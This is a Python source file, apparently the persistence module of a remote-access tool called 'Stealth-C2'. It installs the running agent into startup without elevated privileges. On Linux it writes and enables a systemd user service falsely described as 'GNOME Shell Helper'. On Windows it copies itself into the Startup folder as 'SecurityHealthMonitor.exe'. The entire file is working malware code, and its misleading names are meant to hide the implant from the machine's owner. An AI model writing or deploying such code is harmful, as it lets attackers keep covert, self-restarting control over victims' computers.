"""
Stealth-C2 — Persistence Engine
Installs the agent into OS startup mechanisms without requiring elevated privileges.

Linux   — systemd user service (~/.config/systemd/user/)
Windows — Startup folder copy
"""

from __future__ import annotations

import os
import sys
import shutil
import platform
import subprocess


def _current_exe() -> str:
    """Resolve the running script or frozen binary path."""
    return sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])


def install_persistence(args=None) -> str:
    exe    = _current_exe()
    system = platform.system()

    if system == "Linux":
        service_dir  = os.path.expanduser("~/.config/systemd/user/")
        service_path = os.path.join(service_dir, "stealth-agent.service")
        os.makedirs(service_dir, exist_ok=True)

        unit = (
            "[Unit]\nDescription=GNOME Shell Helper\nAfter=network.target\n\n"
            "[Service]\n"
            f"ExecStart=/usr/bin/python3 {exe}\n"
            "Restart=always\nRestartSec=5\n\n"
            "[Install]\nWantedBy=default.target\n"
        )
        try:
            with open(service_path, "w") as fh:
                fh.write(unit)
            subprocess.run(["systemctl", "--user", "enable", "stealth-agent"], check=True, capture_output=True)
            subprocess.run(["systemctl", "--user", "start",  "stealth-agent"], check=True, capture_output=True)
            return "✅  Linux persistence installed (systemd user service)."
        except Exception as e:
            return f"⚠️  Linux persistence failed: {e}"

    if system == "Windows":
        startup = os.path.join(os.getenv("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup")
        target  = os.path.join(startup, "SecurityHealthMonitor.exe")
        try:
            shutil.copy(exe, target)
            return "✅  Windows persistence installed (Startup folder)."
        except Exception as e:
            return f"⚠️  Windows persistence failed: {e}"

    return f"⚠️  Unsupported platform: {system}"